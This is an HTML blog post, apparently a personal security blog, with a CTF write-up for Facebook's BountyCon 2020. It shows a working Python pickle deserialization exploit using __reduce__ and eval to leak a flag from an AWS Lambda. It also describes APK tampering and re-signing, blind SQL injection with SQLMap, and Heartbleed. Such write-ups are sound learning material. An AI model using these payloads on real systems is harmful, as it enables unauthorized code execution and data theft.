@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="BountyCon2020BountyCon is an invitation-only application security conference arranged by Facebook annually in Singapore for the BugBounty Community of Asia-Pacific region. For more information about i">
+<meta name="keywords" content="CTF,WebSecurity,Facebook,Hacking,BugBounty">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Facebook&#39;s BountyCon 2020 CTF Writeup">
+<meta property="og:url" content="https://blog.shoebpatel.com/2020/01/31/Facebooks-BountyCon-2020-CTF-Writeup/index.html">
+<meta property="og:site_name" content="CaptainFreak">
+<meta property="og:description" content="BountyCon2020BountyCon is an invitation-only application security conference arranged by Facebook annually in Singapore for the BugBounty Community of Asia-Pacific region. For more information about i">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2020-01-31T14:55:37.252Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Facebook&#39;s BountyCon 2020 CTF Writeup">
+<meta name="twitter:description" content="BountyCon2020BountyCon is an invitation-only application security conference arranged by Facebook annually in Singapore for the BugBounty Community of Asia-Pacific region. For more information about i">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Facebook&#39;s BountyCon 2020 CTF Writeup</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/CaptainFreak">Projects</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/03/23/FireShell-CTF-2020-Write-up/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2018/10/20/CaptainFreak-Experience-1-HacktoberFest-2018/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://blog.shoebpatel.com/2020/01/31/Facebooks-BountyCon-2020-CTF-Writeup/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://blog.shoebpatel.com/2020/01/31/Facebooks-BountyCon-2020-CTF-Writeup/&text=Facebook&#39;s BountyCon 2020 CTF Writeup"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://blog.shoebpatel.com/2020/01/31/Facebooks-BountyCon-2020-CTF-Writeup/&title=Facebook&#39;s BountyCon 2020 CTF Writeup"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.shoebpatel.com/2020/01/31/Facebooks-BountyCon-2020-CTF-Writeup/&is_video=false&description=Facebook&#39;s BountyCon 2020 CTF Writeup"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Facebook&#39;s BountyCon 2020 CTF Writeup&body=Check out this article: https://blog.shoebpatel.com/2020/01/31/Facebooks-BountyCon-2020-CTF-Writeup/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://blog.shoebpatel.com/2020/01/31/Facebooks-BountyCon-2020-CTF-Writeup/&title=Facebook&#39;s BountyCon 2020 CTF Writeup"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://blog.shoebpatel.com/2020/01/31/Facebooks-BountyCon-2020-CTF-Writeup/&title=Facebook&#39;s BountyCon 2020 CTF Writeup"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://blog.shoebpatel.com/2020/01/31/Facebooks-BountyCon-2020-CTF-Writeup/&title=Facebook&#39;s BountyCon 2020 CTF Writeup"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://blog.shoebpatel.com/2020/01/31/Facebooks-BountyCon-2020-CTF-Writeup/&title=Facebook&#39;s BountyCon 2020 CTF Writeup"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://blog.shoebpatel.com/2020/01/31/Facebooks-BountyCon-2020-CTF-Writeup/&name=Facebook&#39;s BountyCon 2020 CTF Writeup&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#BountyCon2020"><span class="toc-number">1.</span> <span class="toc-text">BountyCon2020</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF-Writeup"><span class="toc-number">2.</span> <span class="toc-text">CTF Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Tick-Tock"><span class="toc-number">2.1.</span> <span class="toc-text">1. Tick-Tock</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Lighthouse"><span class="toc-number">2.2.</span> <span class="toc-text">2. Lighthouse</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Shake-it"><span class="toc-number">2.3.</span> <span class="toc-text">3. Shake it</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Who’s-Sequel"><span class="toc-number">2.4.</span> <span class="toc-text">4. Who’s Sequel</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Heart-of-Stone"><span class="toc-number">2.5.</span> <span class="toc-text">5. Heart of Stone</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Facebook&#39;s BountyCon 2020 CTF Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">CaptainFreak</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2020-01-31T10:22:59.000Z" itemprop="datePublished">2020-01-31</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/BugBounty/">BugBounty</a>, <a class="tag-link" href="/tags/CTF/">CTF</a>, <a class="tag-link" href="/tags/Facebook/">Facebook</a>, <a class="tag-link" href="/tags/Hacking/">Hacking</a>, <a class="tag-link" href="/tags/WebSecurity/">WebSecurity</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="BountyCon2020"><a href="#BountyCon2020" class="headerlink" title="BountyCon2020"></a>BountyCon2020</h2><p>BountyCon is an invitation-only application security conference arranged by Facebook annually in Singapore for the BugBounty Community of Asia-Pacific region.</p>
+<p>For more information about it, check <a href="https://www.facebook.com/whitehat/ctf/bountycon2020/" target="_blank" rel="noopener">here.</a></p>
+<p>BountyCon2020 is the second edition. I was lucky enough to win an all-sponsored invitation from Facebook to attend the last edition and it was just an amazing experience filled with lots of hacking, knowledge sharing, traveling around Singapore, networking and hacking discussions over food and drinks with fellow bug bounty hunters and talented hackers from all over the world. It can’t get better than that for a Hacker. </p>
+<p>Shoutout to Hackers who made that trip a memorable one. <a href="https://twitter.com/prateek_0490" target="_blank" rel="noopener">Prateek Tiwari</a>, <a href="https://twitter.com/bhavukjain1" target="_blank" rel="noopener">Bhavuk Jain</a>, <a href="https://twitter.com/iamnoooob" target="_blank" rel="noopener">Rahul Maini</a>, <a href="https://twitter.com/HivarekarPranav" target="_blank" rel="noopener">Pranav Hivarekar</a>, <a href="https://twitter.com/sehacure" target="_blank" rel="noopener">Anand Prakash</a> and everyone else from <a href="https://twitter.com/Inbughunters" target="_blank" rel="noopener">Indian Bug Hunters</a> Community.</p>
+<p>To get an invite, one has to top the leaderboard of <a href="https://www.facebook.com/whitehat/ctf/bountycon2020/rules/" target="_blank" rel="noopener">BountyCon CTF</a>. </p>
+<h2 id="CTF-Writeup"><a href="#CTF-Writeup" class="headerlink" title="CTF Writeup"></a>CTF Writeup</h2><p>Following is a writeup for a challenge that I really liked solving and learned some new things in the process.</p>
+<h3 id="1-Tick-Tock"><a href="#1-Tick-Tock" class="headerlink" title="1. Tick-Tock"></a>1. Tick-Tock</h3><p>This was a white-box challenge around a python library. Code for an AWS lambda function was given which was vulnerable to arbitrary unpickling of Python Objects through pickle serialization library. </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class Epoch(object):</span><br><span class="line">    def __init__(self, timestamp):</span><br><span class="line">        self.ts = timestamp</span><br><span class="line"></span><br><span class="line">epoch = Epoch(&apos;&#123;:d&#125;&apos;.format(int(time.time())))</span><br><span class="line">cookie = base64.b64encode(pickle.dumps(epoch))</span><br></pre></td></tr></table></figure>
+<p>The possible arbitrary code execution exploitation of pickle library was shut down by use of Lambda’s function shield which would block all the read, write, outbound connectivity and child process creation attempts. </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function_shield.configure(&#123;</span><br><span class="line">    &quot;policy&quot;: &#123;</span><br><span class="line">        &quot;outbound_connectivity&quot;: &quot;block&quot;,</span><br><span class="line">        &quot;read_write_tmp&quot;: &quot;block&quot;,</span><br><span class="line">        &quot;create_child_process&quot;: &quot;block&quot;,</span><br><span class="line">        &quot;read_handler&quot;: &quot;block&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p>The flag for the challenge was in a globally initialized variable. </p>
+<p>Pseudo-Code of the execution was like the following:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">If cookie is not set:</span><br><span class="line">    - Initialize an Object of Epoch class with the timestamp.</span><br><span class="line">    - Pickle this Object and set it as a cookie.</span><br><span class="line">    - Send the response with an empty body.</span><br><span class="line">Else:</span><br><span class="line">    - Unpickle the cookie value.</span><br><span class="line">    - Get the timestamp value from the cookie.</span><br><span class="line">    - Send a page with HTML which shows timer using this timestamp variable.</span><br></pre></td></tr></table></figure>
+<p>So in a nutshell, whatever gets assigned to the timestamp variable of Epoch Class gets reflected into the HTML source. This was the trick to solve the challenge. We somehow had to trick the code into initializing the reflection with the flag variable and we had unpickling as a way to do it.</p>
+<p>To arrive at the following <code>solution</code>, I scoured through the original documentation of pickle <a href="https://docs.python.org/3/library/pickle.html" target="_blank" rel="noopener">docs</a>.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">class Epoch(object):</span><br><span class="line">    def __init__(self, timestamp):</span><br><span class="line">        self.ts = timestamp</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval, ((&apos;Epoch(flag)&apos;),))</span><br><span class="line"></span><br><span class="line">def lambda_handler(event,con):</span><br><span class="line">    epoch = Epoch(&quot;31337&quot;)</span><br><span class="line">    cookie = base64.b64encode(pickle.dumps(epoch))</span><br><span class="line">    </span><br><span class="line">    return &#123;</span><br><span class="line">        &apos;statusCode&apos;: 200,</span><br><span class="line">        &apos;Exploit-Cookie&apos;: cookie</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>To manipulate it, we have the <code>__reduce__</code> method which will govern the object creation upon successful unpickling. The above code returns a tuple with the first argument being the callable and second being the argument. The result of unpickling the pickled byte-stream of the above class’s instance will be <code>eval(&#39;Epoch(flag)&#39;)</code> getting executed and the result of eval getting directly returned.</p>
+<p>In this case, it will be an instance of Epoch class getting initialized with flag variable and the variable containing flag string will get reflected into the HTML by the following code.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">epoch = pickle.loads(base64.b64decode(</span><br><span class="line">    event[&apos;multiValueHeaders&apos;][&apos;cookie&apos;][0]))</span><br><span class="line">return &#123;</span><br><span class="line">   &apos;body&apos;: clock_page(epoch.ts)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>So with our exploit, it will indirectly mean,</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">epoch = Epoch(flag)</span><br></pre></td></tr></table></figure>
+<p>In this way, we successfully get the value of the flag variable in the <code>ts</code>  class variable.</p>
+<p><hr></p>
+<hr>
+
+<p><strong>Following are the challenges that were not much exciting compared to tick-tock:</strong></p>
+<h3 id="2-Lighthouse"><a href="#2-Lighthouse" class="headerlink" title="2. Lighthouse"></a>2. Lighthouse</h3><p>Challenge had an android app. Upon reversing and analyzing the apk, It was clear that the app is taking flag string from native code, changing it to morse code string and using it to light the flash of the phone.<br>I had multiple ideas to solve it but I solved it by using a <a href="https://github.com/matja/video-morse-decode" target="_blank" rel="noopener">C++ tool</a> which converts a video to morse code. I was not very sure that it was good enough to detect the morse code from the video stream of phone flash But I gave it a try anyway, The code is outdated and hence it was not getting compiled, made some tweaks to the C++ code so that it should compile. I recorded a video of phone flashing and fed it the compiled binary. It worked like a charm.</p>
+<h3 id="3-Shake-it"><a href="#3-Shake-it" class="headerlink" title="3. Shake it"></a>3. Shake it</h3><p>This also was consisting of an android app.  As its name suggests, It was counting down the 10 million shakes of the phone and upon completion of those many shakes, it would reveal the flag string stored in native code.<br>Decompiled the apk using <code>apktool</code>.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apktool d shake-it.apk</span><br></pre></td></tr></table></figure>
+<p>updated the smali code which was initializing this counter of 10 mils. to 10.</p>
+<p>0xF4240 -&gt; 0xA in the MainActivity.smali</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> // In MainActivity.smali</span><br><span class="line">.field private static final TARGET:I = 0xF4240</span><br><span class="line"></span><br><span class="line">  			to</span><br><span class="line"></span><br><span class="line">.field private static final TARGET:I = 0xA</span><br></pre></td></tr></table></figure>
+<p>Built the apk again.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apktool b shake-it -o shake-it-modified.apk</span><br></pre></td></tr></table></figure>
+<p>Self-signed it.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ keytool -genkey -v -keystore key.keystore -alias self -keyalg RSA -keysize 2048 -validity 10000</span><br><span class="line"></span><br><span class="line">$ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore shake-it-modified.apk self</span><br></pre></td></tr></table></figure>
+<p>Installed the apk and shaken the phone ten times, got the flag!</p>
+<h3 id="4-Who’s-Sequel"><a href="#4-Who’s-Sequel" class="headerlink" title="4. Who’s Sequel"></a>4. Who’s Sequel</h3><p>This challenge had a login form. Upon fuzzing it was clear that it was vulnerable to Blind SQLi. Dumping the table using SQLMap revealed the flag in the last row of one of the tables.</p>
+<h3 id="5-Heart-of-Stone"><a href="#5-Heart-of-Stone" class="headerlink" title="5. Heart of Stone"></a>5. Heart of Stone</h3><p>The Challenge name and Server header in response gave away the hint of HeartBleed (CVE-2014-0160), Exploited and read the memory containing the flag.</p>
+<hr>
+
+<p>Due to work and other stuff, I don’t get much time to participate in CTFs for fun. But I recently formed a CTF team, <a href="https://github.com/TeamUnderdawgs" target="_blank" rel="noopener"><strong>UnderDawgs</strong></a> with <a href="https://twitter.com/0xrudrapratap" target="_blank" rel="noopener">Rudra</a> and <a href="https://twitter.com/ArbazKiraak" target="_blank" rel="noopener">Arbaz</a> and we are actively looking for people experienced in Pwn, Crypto and Reversing CTF challenges. If you think you can contribute to the team, Please reach out.</p>
+<p>Thanks for reading.</p>
+<p>Hack the Planet,<br>CaptainFreak</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/CaptainFreak">Projects</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#BountyCon2020"><span class="toc-number">1.</span> <span class="toc-text">BountyCon2020</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF-Writeup"><span class="toc-number">2.</span> <span class="toc-text">CTF Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Tick-Tock"><span class="toc-number">2.1.</span> <span class="toc-text">1. Tick-Tock</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-Lighthouse"><span class="toc-number">2.2.</span> <span class="toc-text">2. Lighthouse</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-Shake-it"><span class="toc-number">2.3.</span> <span class="toc-text">3. Shake it</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Who’s-Sequel"><span class="toc-number">2.4.</span> <span class="toc-text">4. Who’s Sequel</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-Heart-of-Stone"><span class="toc-number">2.5.</span> <span class="toc-text">5. Heart of Stone</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://blog.shoebpatel.com/2020/01/31/Facebooks-BountyCon-2020-CTF-Writeup/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://blog.shoebpatel.com/2020/01/31/Facebooks-BountyCon-2020-CTF-Writeup/&text=Facebook&#39;s BountyCon 2020 CTF Writeup"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://blog.shoebpatel.com/2020/01/31/Facebooks-BountyCon-2020-CTF-Writeup/&title=Facebook&#39;s BountyCon 2020 CTF Writeup"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.shoebpatel.com/2020/01/31/Facebooks-BountyCon-2020-CTF-Writeup/&is_video=false&description=Facebook&#39;s BountyCon 2020 CTF Writeup"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Facebook&#39;s BountyCon 2020 CTF Writeup&body=Check out this article: https://blog.shoebpatel.com/2020/01/31/Facebooks-BountyCon-2020-CTF-Writeup/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://blog.shoebpatel.com/2020/01/31/Facebooks-BountyCon-2020-CTF-Writeup/&title=Facebook&#39;s BountyCon 2020 CTF Writeup"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://blog.shoebpatel.com/2020/01/31/Facebooks-BountyCon-2020-CTF-Writeup/&title=Facebook&#39;s BountyCon 2020 CTF Writeup"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://blog.shoebpatel.com/2020/01/31/Facebooks-BountyCon-2020-CTF-Writeup/&title=Facebook&#39;s BountyCon 2020 CTF Writeup"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://blog.shoebpatel.com/2020/01/31/Facebooks-BountyCon-2020-CTF-Writeup/&title=Facebook&#39;s BountyCon 2020 CTF Writeup"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://blog.shoebpatel.com/2020/01/31/Facebooks-BountyCon-2020-CTF-Writeup/&name=Facebook&#39;s BountyCon 2020 CTF Writeup&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 CaptainFreak
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/About/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/CaptainFreak">Projects</a></li>
+         
+          <li><a href="/Search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-113860447-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'captainfreaks-infosec-blog';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
